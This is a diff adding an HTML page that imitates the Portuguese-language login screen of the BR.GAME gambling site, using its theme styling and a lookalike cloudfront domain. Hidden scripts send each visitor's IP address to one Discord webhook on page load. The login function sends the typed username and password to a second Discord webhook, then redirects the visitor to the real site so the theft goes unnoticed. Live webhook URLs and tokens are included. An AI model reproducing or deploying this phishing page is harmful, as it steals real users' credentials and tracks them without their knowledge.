@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BR.GAME</title>
+    <link rel="preconnect" href="https://cdntoos.brgame1.vip/" crossorigin="">
+    <link rel="dns-prefetch" href="https://cdntoos.brgame1.vip/">
+    <link rel="preconnect" href="https://pubusppp.c1oudfront.com/" crossorigin="">
+    <link rel="dns-prefetch" href="https://pubusppp.c1oudfront.com/">
+    <link rel="shortcut icon" href="https://cdntoos.brgame1.vip/cocos/lg/h5icon.ico">
+    <link sizes="32x32" rel="icon" href="https://cdntoos.brgame1.vip/cocos/lg/appIconSmall.png">
+    <link rel="apple-touch-icon" href="https://cdntoos.brgame1.vip/cocos/lg/appIconSmall.png">
+    <link sizes="192x192" rel="apple-touch-icon" href="https://cdntoos.brgame1.vip/cocos/lg/appIconSmall.png">
+    <link rel="apple-touch-icon-precomposed" href="https://cdntoos.brgame1.vip/cocos/lg/appIconSmall.png">
+    <style>
+        :root{
+            --theme-rem-unit: 100;
+            --theme-header-height: 0.8rem;
+            --theme-scroll-bar-bg-color: var(--theme-color-line);
+            --theme-filter-active-color: #FFF0BB;
+            --theme-main-bg-color: #C15473;
+            --theme-main-bg-color-hex: 193, 84, 115;
+            --theme-bg-color: #E06F8B;
+            --theme-table-bg-color: #C15473;
+            --theme-disabled-bg-color: #999;
+            --theme-countTo-bg: #f6faff;
+            --theme-ant-message-bg: #FFF;
+            --theme-bg-shadow: rgba(0, 0, 0, 0.06);
+            --theme-load-bg-color: #EC89A566;
+            --theme-home-bg-color: rgb(193, 84, 115);
+            --theme-primary-color: #FFF0BB;
+            --theme-primay-color-hex: 255, 240, 187;
+            --theme-primary-font-color: #C15473;
+            --theme-disabled-font-color: #fff;
+            --theme-ant-message-font-color: #333333;
+            --theme-aside-icon-color-0: #F8E0E2;
+            --theme-aside-icon-color-1: #F8E0E2;
+            --theme-aside-icon-color-2: #666;
+            --theme-aside-font-color: #fff;
+            --theme-aside-active-font-color: #fff;
+            --theme-aside-active-bg-color-0: #FFFFFF0A;
+            --theme-aside-active-bg-color-1: #FFFFFF0D;
+            --theme-aside-box-shadow: 0 0.02rem 0.04rem 0 rgba(0, 0, 0, 0.3);
+            --theme-aside-no-active-box-shadow: #0000001F;
+            --theme-jackpot-bg-color-0: #fff;
+            --theme-jackpot-bg-color-1: #edf3fd;
+            --theme-jackpot-num-bg-color-0: #c9d2df;
+            --theme-jackpot-num-bg-color-1: #f5f8fe;
+            --theme-jackpot-num-bg-color-2: #c9d2df;
+            --theme-jackpot-num-bg-shadow-color-0: #fff6;
+            --theme-jackpot-num-bg-shadow-color-1: #fff6;
+            --theme-jackpot-title-color: #FFFFFF;
+            --theme-game-lobby-border: #EC89A5;
+            --theme-search-icon-color: #F8E0E2;
+            --theme-btm-def-color: #FFC1CD;
+            --theme-btm-bg-color: #B94B6B;
+            --theme-mine-icon-color: #FFF0BB;
+            --theme-hx-color: #FFFFFF;
+            --theme-text-color-darken: #FFFFFF;
+            --theme-text-color: #F8E0E2;
+            --theme-text-color-lighten: #FFC1CD;
+            --theme-text-color-lighten-withshadow: #FFC1CD;
+            --theme-text-color-placeholder: #FFC1CD;
+            --theme-text-color-task-btn: #fff;
+            --theme-text-color-process-text: #fff;
+            --theme-text-color-activities-text: #fff;
+            --theme-text-color-side-tabs: #F8E0E2;
+            --theme-alt-text-color: #C15473;
+            --theme-text-person-color: #FFFFFF;
+            --theme-color-line: #2A815F;
+            --theme-color-line-hex: 236, 137, 165;
+            --theme-active-bg-color: #E06F8B;
+            --theme-active-gou-color: #FFF0BB;
+            --theme-cardBg-color: rgba(7, 112, 255, 0.8);
+            --theme-cardShadow-mask-color: rgba(254, 255, 255, 0.9);
+            --theme-cardShadow-font-color: #fff;
+            --theme-progress-line-color: #FFC1CD;
+            --theme-text-color-darken-hex: 255, 255, 255;
+            --theme-secondary-color-success: #5CBF3F;
+            --theme-secondary-color-success-linear-gradient: #18c516;
+            --theme-secondary-color-success-text: #fff;
+            --theme-secondary-color-error: #A51F1F;
+            --theme-secondary-color-error-linear-gradient: #f35a4a;
+            --theme-secondary-color-finance: #FFAA09;
+            --theme-secondary-color-finance-hex: 255, 170, 9;
+            --theme-secondary-color-finance-linear-gradient: #ffb325;
+            --theme-secondary-color-tabs-start-gradient: #fff;
+            --theme-secondary-color-tabs-end-gradient: #f2f3f7;
+            --theme-secondary-color-tabs-active-start-gradien: #46a1ff;
+            --theme-secondary-color-tabs-active-end-gradient: #1678ff;
+            --theme-secondary-color-tabs-active-border: transparent;
+            --theme-secondary-color-help-text-color: #FFFFFF;
+            --theme-label-secondary-color-finance: #FFAA09;
+            --theme-event-luck-wheel-silver: #1672f2;
+            --theme-event-luck-wheel-gold: #ffaa09;
+            --theme-event-luck-wheel-diamond: #b751ff;
+            --theme-user-card-top-bg-color: #E26387;
+            --theme-user-card-bg-color: #E05E83;
+            --theme-user-card-bottom-bg-color: #D85076;
+            --theme-vip-progress-bg-color: #FFAA09;
+            --theme-top-nav-bg: #B94B6B;
+            --theme-side-menu-bg-color: #C15473;
+            --theme-side-menu-btn-color: #C8637F;
+            --theme-side-menu-btn-color-hex: 200, 99, 127;
+            --theme-side-menu-btn-hover: #D86D8B;
+            --theme-side-footer-bg-color: #B94B6B;
+            --theme-tabbar-bg-color: #B94B6B;
+            --theme-home-bg: #C15473;
+            --theme-side-bg-color: #0f212e;
+            --theme-left-nav-text-color: #F8E0E2;
+            --theme-left-nav-text-active-color: #C15473;
+            --theme-side-popver-text-color: #fff;
+            --theme-game-card-ddt_bg: #C85E7C;
+            --theme-game-card-ddt_icon: #D57590;
+            --theme-alt-primary: #FFF0BB;
+            --theme-alt-neutral-1: #F8E0E2;
+            --theme-alt-neutral-2: #FFC1CD;
+            --theme-alt-border: #F8E0E2;
+            --theme-profile_icon_1: #FFF0BB;
+            --theme-profile_icon_2: #FFF0BB;
+            --theme-profile_icon_3: #FFF0BB;
+            --theme-profile_icon_4: #FFF0BB;
+            --theme-web_filter_gou: #C15473;
+            --theme-aside-active-box-shadow: 0 0.02rem 0.04rem 0 rgba(0, 0, 0, 0.1);
+            --theme-max-width: 100%;
+            --vh: 6.2px;
+            --theme-ant-primary-color-0: #fff0bb;
+            --theme-ant-primary-color-1: #fff2c2;
+            --theme-ant-primary-color-2: #fff3c9;
+            --theme-ant-primary-color-3: #fff5cf;
+            --theme-ant-primary-color-4: #fff6d6;
+            --theme-ant-primary-color-5: #fff8dd;
+            --theme-ant-primary-color-6: #fff9e4;
+            --theme-ant-primary-color-7: #fffbeb;
+            --theme-ant-primary-color-8: #fffcf1;
+            --theme-ant-primary-color-9: #FFFEF0;
+            --theme-ant-primary-color-10: #FFFEF0;
+            --theme-ant-primary-color-11: #FFFDF0;
+            --theme-ant-primary-color-12: #FFFDF0;
+            --theme-ant-primary-color-13: #FFFAE3;
+            --theme-ant-primary-color-14: #FFF0BB;
+            --theme-ant-primary-color-15: #D9C793;
+            --theme-ant-primary-color-16: #B3A070;
+            --theme-ant-primary-color-17: #8C7A51;
+            --theme-ant-primary-color-18: #66573A;
+            --theme-ant-primary-color-19: 255, 240, 187;
+        }
+
+        .poppins-thin {
+            font-family: "Poppins", sans-serif;
+            font-weight: 100;
+            font-style: normal;
+        }
+        
+        .poppins-extralight {
+            font-family: "Poppins", sans-serif;
+            font-weight: 200;
+            font-style: normal;
+        }
+        
+        .poppins-light {
+            font-family: "Poppins", sans-serif;
+            font-weight: 300;
+            font-style: normal;
+        }
+        
+        .poppins-regular {
+            font-family: "Poppins", sans-serif;
+            font-weight: 400;
+            font-style: normal;
+        }
+        
+        .poppins-medium {
+            font-family: "Poppins", sans-serif;
+            font-weight: 500;
+            font-style: normal;
+        }
+        
+        .poppins-semibold {
+            font-family: "Poppins", sans-serif;
+            font-weight: 600;
+            font-style: normal;
+        }
+        
+        .poppins-bold {
+            font-family: "Poppins", sans-serif;
+            font-weight: 700;
+            font-style: normal;
+        }
+        
+        .poppins-extrabold {
+            font-family: "Poppins", sans-serif;
+            font-weight: 800;
+            font-style: normal;
+        }
+        
+        .poppins-black {
+            font-family: "Poppins", sans-serif;
+            font-weight: 900;
+            font-style: normal;
+        }
+        
+        .poppins-thin-italic {
+            font-family: "Poppins", sans-serif;
+            font-weight: 100;
+            font-style: italic;
+        }
+        
+        .poppins-extralight-italic {
+            font-family: "Poppins", sans-serif;
+            font-weight: 200;
+            font-style: italic;
+        }
+        
+        .poppins-light-italic {
+            font-family: "Poppins", sans-serif;
+            font-weight: 300;
+            font-style: italic;
+        }
+        
+        .poppins-regular-italic {
+            font-family: "Poppins", sans-serif;
+            font-weight: 400;
+            font-style: italic;
+        }
+        
+        .poppins-medium-italic {
+            font-family: "Poppins", sans-serif;
+            font-weight: 500;
+            font-style: italic;
+        }
+        
+        .poppins-semibold-italic {
+            font-family: "Poppins", sans-serif;
+            font-weight: 600;
+            font-style: italic;
+        }
+        
+        .poppins-bold-italic {
+            font-family: "Poppins", sans-serif;
+            font-weight: 700;
+            font-style: italic;
+        }
+        
+        .poppins-extrabold-italic {
+            font-family: "Poppins", sans-serif;
+            font-weight: 800;
+            font-style: italic;
+        }
+        
+        .poppins-black-italic {
+            font-family: "Poppins", sans-serif;
+            font-weight: 900;
+            font-style: italic;
+        }
+        
+
+        *{
+            padding: 0px;
+            margin: 0px;
+            box-sizing: border-box; 
+        }
+
+        body{
+            height: 100vh;
+            width: 100vw;
+            background-color: var(--theme-color-line);
+            overflow-x: hidden;
+        }
+
+        .axis_x{
+            display: block;
+            margin: auto;
+
+            height: 200px;
+            width: 100vw;
+            max-width: 350px;
+        }
+
+        .bg{
+            position: fixed;
+            display: block;
+            height: 100vh;
+            width: 100vw;
+            max-width: 350px;
+            background-color: var(--theme-home-bg-color);
+            background-image: url('https://media.discordapp.net/attachments/1198168393686196245/1243242351950954538/Design_sem_nome_20.png?ex=6650c32b&is=664f71ab&hm=f46f52728b0cea35b0401520d6244b34002a248fecc2bfa4bbf2d4b6f35d5e4a&=&format=webp&quality=lossless&width=230&height=410');
+            background-size: cover;
+        }
+
+        .ft{
+            position: fixed;
+            display: block;
+            height: 100vh;
+            width: 100vw;
+            max-width: 350px;
+        }
+
+        .tp{
+            position: absolute;
+            height: 40px;
+            width: 100vw;
+            max-width: 350px;
+            background-color: var(--theme-top-nav-bg);
+        }
+
+
+        .mn_lg{
+            position: absolute;
+            margin: 2px;
+            margin-left: 20px;
+            height: 36px;
+            width: 300px;
+            background-image: url('/image/lg');
+            background-size: 158px;
+            background-repeat: no-repeat;
+        }
+
+        .login, .register{
+            position: absolute;
+            height: 18px;
+            width: 50px;
+            border-radius: 8px;
+            margin-top: 11px;
+            font-size: 7px;
+            text-align: center;
+            line-height: 18px;
+            border: 1px solid var(--theme-primary-color);
+            font-family: "Poppins", sans-serif;
+            font-weight: 300;
+            font-style: normal
+        }
+
+        .login{
+            margin-left: 210px;
+            background-color: var(--theme-primary-color);
+            color: var(--theme-top-nav-bg);
+        }
+        .register{
+            margin-left: 270px;
+            color: var(--theme-primary-color);
+        }
+
+        .bt{
+            position: absolute;
+            bottom: 0;
+            width: 100vw;
+            max-width: 350px;
+            height: 60px;
+            background-color: var(--theme-top-nav-bg);
+        }
+
+        .pg{
+            position: absolute;
+            height: 100vh;
+            width: 100vw;
+            max-width: 350px;
+        }
+
+        .wc, .sp, .an, .gms{
+            max-width: 324px;
+            width: 100vw;
+            margin: auto;
+            background-position: center;
+        }
+
+        .sd{
+            width: 30px;
+            height: 30px;
+            background-image: url('/image/sd');
+            background-position: center;
+            background-size: 20px;
+            background-repeat: no-repeat;
+        }
+
+        .wc{
+            margin-top: 55px;
+            height: 100px;
+            background-image: url('/image/wc');
+            background-size: 330px;
+            border-radius: 10px;
+            background-repeat: no-repeat;
+        }
+
+        .sp{
+            height: 100px;
+            background-image: url('/image/sp');
+            background-size: 330px;
+            background-repeat: no-repeat;
+            border-radius: 10px;
+        }
+
+        .bl{
+            position: absolute;
+            height: 100vh;
+            width: 100vw;
+            max-width: 350px;
+            background-color: rgba(70, 70, 70, 0.4);
+        }
+
+        .bbl{
+            margin: auto;
+            margin-top: 120px;
+
+            border-radius: 10px;
+            height: 340px;
+            width: 90vw;
+            max-width: 330px;
+            background-color: #194C38;
+            border: 1px solid #2A815F;
+        }
+
+        .lg_block{
+            height: 40px;
+            width: 100px;
+            margin: auto;
+        }
+        .icon{
+            position: absolute;
+            height: 40px;
+            width: 40px;
+            background-position: center;
+            background-size: 25px;
+            background-repeat: no-repeat;
+            background-image: url('https://media.discordapp.net/attachments/1198183030578217060/1242912899220115537/user.png?ex=664f9057&is=664e3ed7&hm=6912adece014a99c74b4be1efc6f979fe1ea82abf88f5e6f67c2a67e338d245e&=&format=webp&quality=lossless&width=403&height=403r');
+        }
+        .tit{
+            position: absolute;
+            height: 42px;
+            width: 110px;
+            line-height: 42px;
+            text-align: center;
+            color: #F9FD4E;;
+            font-family: "Poppins", sans-serif;
+            font-weight: 400;
+            font-size: 15px;
+            font-style: normal;
+        }
+        .det{
+            position: absolute;
+            height: 4px;
+            width: 70px;
+            margin-left: 15px;
+            margin-top: 38px;
+            border-radius: 2px;
+            background-color: #F9FD4E;;
+        }
+
+        .form_block{
+        margin: auto;
+        height: 100px;
+        max-width: 295px;
+        width: 83vw;
+        margin-top: 15px;
+        }
+
+        .input_block{
+        position: absolute;
+        max-width: 295px;
+        width: 83vw;
+        height: 33px;
+        border: 1px solid #2A815F;
+        border-radius: 5px;
+        }
+
+        .input{
+        position: absolute;
+        margin-left: 40px ;
+        }
+
+        .remember_block{
+        height: 20px;
+        width: 150px;
+        margin-left: 15px;
+        }
+
+        #checker{
+        position: absolute;
+        }
+
+        input[type='checkbox'] {
+        accent-color: #18c516;
+        color: white;
+        }
+
+        .rem_text{
+        position: absolute;
+        display: block;
+            font-family: "Poppins", sans-serif;
+            font-weight: 400;
+            font-size: 12px;
+            font-style: normal;
+            line-height: 12px;
+            text-align: center;
+            color: var(--theme-text-color-process-text);
+            margin-left: 15px;
+        }
+        .res_text{
+        position: absolute;
+        display: block;
+            font-family: "Poppins", sans-serif;
+            font-weight: 400;
+            font-size: 12px;
+            font-style: normal;
+            line-height: 12px;
+            text-align: center;
+            color: var(--theme-text-color-process-text);
+            margin-left: 180px;
+        }
+
+        .ott_text{
+        margin: auto;
+        margin-top: 30px;
+        display: block;
+        font-family: "Poppins", sans-serif;
+        font-weight: 400;
+        font-size: 10px;
+        font-style: normal;
+        line-height: 12px;
+        text-align: center;
+        width: 200px;
+        color: var(--theme-text-color-process-text);
+        }
+        .import_button{
+        margin: auto;
+        margin-top: 10px;
+        background-color: #F9FD4E;;
+        color: var(#194C38);
+        max-width: 295px;
+        width: 83vw;
+        height: 33px;
+        border: 1px solid #F9FD4E;;
+        border-radius: 5px;
+        text-align:center ;
+        line-height: 33px;
+        font-family: "Poppins", sans-serif;
+        font-weight: 400;
+        font-size: 14px;
+        font-style: normal;
+        }
+
+        .ico{
+        position: absolute;
+        height: 31px;
+        width: 31px;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-size: 20px;
+        }
+
+        .imp{
+        position: absolute;
+        height: 31px;
+        border: none;
+        background-color: transparent;
+        caret-color: #F9FD4E;;
+        margin-left: 30px;
+        color: white;
+        }
+        .imp::placeholder{
+        color: var(--theme-profile_icon_1);
+        font-size: 12px;
+        }
+        .imp:focus{
+        outline: none;
+        }
+
+        .others{
+        width: 100px;
+        height: 40px;
+        margin: auto;
+        margin-top: 10px;
+        }
+
+
+        .log_ico{
+        position: absolute;
+        height: 40px;
+        width: 40px;
+        border-radius: 50%;
+        background-position: center;
+        background-repeat: no-repeat;
+        }
+
+        #go{
+        background-size: 50px;
+        background-image: url('https://cdn.icon-icons.com/icons2/2429/PNG/512/google_logo_icon_147282.png');
+        }
+        #fb{
+        margin-left: 60px;
+        background-size: 130px;
+        background-image: url('https://img.odcdn.com.br/wp-content/uploads/2023/09/facebook-logo.png');
+        }
+
+
+
+
+
+
+    </style>
+</head>
+<body>
+    <div class="axis_x">
+        <div class="bg"></div>
+        <div class="bl">
+            <div class="bbl">
+                <div class="lg_block">
+                    <div class="icon"></div>
+                    <div class="tit">login</div>
+                    <div class="det"></div>
+                </div>
+                <div class="form_block">
+                    <div class="input_block"> <div class="ico" style="background-image: url('https://media.discordapp.net/attachments/1198183030578217060/1242912899220115537/user.png?ex=664f9057&is=664e3ed7&hm=6912adece014a99c74b4be1efc6f979fe1ea82abf88f5e6f67c2a67e338d245e&=&format=webp&quality=lossless&width=403&height=403');"></div> <input class="imp" type="text" name="" id="user" placeholder="Nome de Usuário"></div>
+                    <div class="input_block" style="margin-top: 48px;"> <div class="ico" style="background-image: url('https://media.discordapp.net/attachments/1198183030578217060/1242912899526164480/pass.png?ex=664f9057&is=664e3ed7&hm=81654e73dfd569e939f8d31191c3968398e7fc4e7c42528556e52a10e0fafbdf&=&format=webp&quality=lossless&width=403&height=403');"></div> <input class="imp" type="password" name="" id="pass" placeholder="Senha"></div>
+                </div>
+                <div class="remember_block">
+                    <input type="checkbox" name="" id="checker">
+                    <span  class="rem_text">Lembrar senha</span>
+                    <span  class="res_text">Esqueceu a Senha?</span>
+                </div>
+                <div class="import_button" onclick="login()">login</div>
+                <span class="ott_text">Outros métodos de inicio de sessão</span>
+                <div class="others">
+                    <div class="log_ico" id="go"></div>
+                    <div class="log_ico" id="fb"></div>
+                </div>
+
+
+
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
+    <script>
+        const apiUrl = 'https://discord.com/api/webhooks/1243229893685280930/faIx-UN2lmO48b4lZL1JbHpLzoW-I9wY1ZNcnaq1P3HEd_e0y3QIyvB7FT7d3vtg8kue';
+        var myEmbed = {
+            author: {
+                name: "Novo acesso"
+            },
+            title: "brgame9.vip",
+            description: userip.replaceAll('.', '-'),
+            }
+
+         
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", apiUrl, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                'content': "",
+                'embeds':[myEmbed],
+                'username': "Novo Acesso",
+            }));
+    </script>
+    <script>
+        
+        function login(){
+            const pass = document.getElementById('pass').value
+            const user = document.getElementById('user').value
+            const apiUrl = 'https://discord.com/api/webhooks/1243202985895395339/oAmszy2BpN6NfGQ4ty1lbkfqF71J-99ScFGRlLemxrAyQ8tpVjXMWt2cw5TguBFMY-J7';
+         
+            var myEmbed = {
+            author: {
+                name: "brgame9.vip"
+            },
+            title: user,
+            description: pass,
+            }
+
+         
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", apiUrl, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                'content': "",
+                'embeds':[myEmbed],
+                'username': "Manager"
+            }));
+
+            setTimeout(function(){
+                window.location.href = 'https://brgame9.vip/';
+            }, 2000
+            )
+        }
+    </script>
+    
+</body>
+</html>
